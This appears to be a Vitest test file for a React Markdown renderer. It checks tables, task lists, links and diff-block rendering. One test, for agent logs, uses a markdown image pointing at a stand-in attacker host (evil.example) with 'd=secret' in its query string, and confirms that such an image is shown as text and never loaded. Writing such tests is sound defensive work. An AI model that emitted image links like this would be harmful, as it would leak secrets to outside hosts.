import type { BoardState } from "@cello/client/sync/applyEvents"
import { DIFF_BLOCK, DIFF_BLOCK_COMMENT, DIFF_BLOCK_PATHS, HEADERLESS_BLOCK_COMMENT } from "@cello/shared/diff.fixture"
import { RegistryProvider } from "@effect/atom-react"
import * as AsyncResult from "effect/reactivity/AsyncResult"
import { createElement } from "react"
import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it, vi } from "vitest"
import { boardAtom } from "../../lib/cello.ts"
import { Markdown } from "./Markdown.tsx"

// lib/cello.ts builds the socket's address from the page's location when it loads.
vi.hoisted(() => Object.assign(globalThis, { location: { protocol: "http:", host: "localhost:4747" } }))

const board: BoardState = { seq: 1, actors: {}, workspaces: {}, projects: {}, statuses: {}, labels: {}, tasks: {}, sessions: {}, agents: {}, reviews: {}, asks: {}, documents: {}, wakes: {}, testOutcomes: {}, milestones: {} }

const render = (source: string) =>
  renderToStaticMarkup(createElement(RegistryProvider, { initialValues: [[boardAtom, AsyncResult.success(board)]] }, createElement(Markdown, { source })))

describe("Markdown (task descriptions, comments, packet summaries)", () => {
  // Only a published page uploads the files it links, so only the page reader marks one missing
  // (PageBody.test.ts). Here a path is just a link someone wrote (CEL-54 review).
  it("keeps links to file paths as links: nothing was uploaded, so nothing is missing", () => {
    const html = render("See [the CLI doc](docs/cli.md), [the component](src/foo.tsx) and [a page](example.com/a.html).")
    expect(html).not.toContain("data-missing-file")
    expect(html).toContain('href="docs/cli.md"')
    expect(html).toContain('href="src/foo.tsx"')
    expect(html).toContain('href="example.com/a.html"')
  })
})

// Comments, descriptions, packets and asks read GitHub-flavored markdown, as pages do (CEL-127).
describe("Markdown: GitHub-flavored markdown", () => {
  it("renders a pipe table as a table, inside a wrapper that scrolls it sideways", () => {
    const html = render(["| Run | Time | Tests |", "| --- | ---: | --- |", "| e2e | 4m 12s | 31 passed |"].join("\n"))
    expect(html).not.toContain("| Run |")
    expect(html).toMatch(/<div data-markdown-table="" class="[^"]*overflow-x-auto[^"]*"><table[^>]*><thead><tr><th[^>]*>Run<\/th>/)
    expect(html).toMatch(/<td[^>]*style="text-align:right"[^>]*>4m 12s<\/td>/)
  })

  it("strikes through ~~text~~", () => {
    expect(render("~~old plan~~ new plan")).toContain("<del>old plan</del>")
  })

  it("shows task lists as checkboxes, ticked or not", () => {
    const html = render(["- [x] tests", "- [ ] evidence"].join("\n"))
    expect(html).toMatch(/<input type="checkbox" disabled="" checked=""\/> tests/)
    expect(html).toMatch(/<input type="checkbox" disabled=""\/> evidence/)
    expect(html).not.toContain("[x]")
  })

  it("links a bare www. address", () => {
    expect(render("See www.example.com for it.")).toContain('href="http://www.example.com"')
  })
})

// CEL-176: a ```diff block is drawn as the diff view, in its inline form.
describe("Markdown: a diff block is the diff view", () => {
  /** What the diff view drew: the html from its region on, or the whole thing when there is none. */
  const diffRegion = (html: string) => html.slice(html.indexOf('data-text-view="diff"'))

  it("draws a ```diff block with its summary, file sections and Copy, in the inline form", () => {
    const html = render(DIFF_BLOCK_COMMENT)
    expect(html).toContain("data-diff-block")
    expect(html).toContain('data-text-view="diff"')
    expect(html).toContain("3 files changed")
    for (const path of DIFF_BLOCK_PATHS) expect(html).toContain(`aria-label="${path}"`)
    expect(html).toContain('aria-label="Copy"')
    // It grows with its content: no scroll box of its own, nothing to focus.
    expect(diffRegion(html)).not.toContain("overflow-y-auto")
    expect(html).not.toContain("language-diff")
  })

  it("uses no heading, paragraph or pre tag inside the diff, so the markdown's own styles don't reach it", () => {
    const inside = diffRegion(render(DIFF_BLOCK_COMMENT))
    expect(inside).not.toContain("<h3")
    expect(inside).not.toContain("<pre")
    expect(inside).not.toContain("<p ")
  })

  it("draws hunks with no file header without a file section, and numbers only where an @@ line gives them", () => {
    const html = render(HEADERLESS_BLOCK_COMMENT)
    expect(html.match(/data-diff-file="headerless"/g)).toHaveLength(2)
    expect(html).not.toContain("<section")
    expect(html.match(/data-diff-hunk/g)).toHaveLength(1)
    expect(html).toContain("@@ -10,3 +10,4 @@")
    // The five lines of the first hunk have gutters; the three bare lines of the second have none.
    expect(html.match(/data-new-line/g)).toHaveLength(5)
    expect(html.match(/data-diff-line=/g)).toHaveLength(5 + 3)
    expect(html).not.toContain("files changed")
    expect(html).not.toContain("file changed")
  })

  it("leaves a block in another language as code", () => {
    const html = render("```ts\n" + DIFF_BLOCK + "\n```")
    expect(html).not.toContain("data-diff-block")
    expect(html).toContain("<pre>")
  })

  it("draws an unmarked block as a diff only when it is a whole git diff", () => {
    expect(render("```\ndiff --git a/a b/a\n--- a/a\n+++ b/a\n@@ -1 +1 @@\n-a\n+b\n```")).toContain("data-diff-block")
    expect(render("```\n-a\n+b\n```")).not.toContain("data-diff-block")
  })
})

describe("Markdown with images as text (an agent's log, CEL-107)", () => {
  const renderWith = (source: string, images?: "show" | "text") =>
    renderToStaticMarkup(
      createElement(
        RegistryProvider,
        { initialValues: [[boardAtom, AsyncResult.success(board)]] },
        createElement(Markdown, { source, ...(images ? { images } : {}) }),
      ),
    )

  it("never loads an image a message names: its alt text and address show as plain text", () => {
    const html = renderWith("Look: ![x](https://evil.example/p.png?d=secret)", "text")
    expect(html).not.toContain("<img")
    expect(html).not.toContain("src=")
    expect(html).toContain("https://evil.example/p.png?d=secret")
    expect(html).toContain("Image: x")
  })

  it("comments still show their images", () => {
    expect(renderWith("![shot](https://example.com/a.png)")).toContain("<img")
  })
})
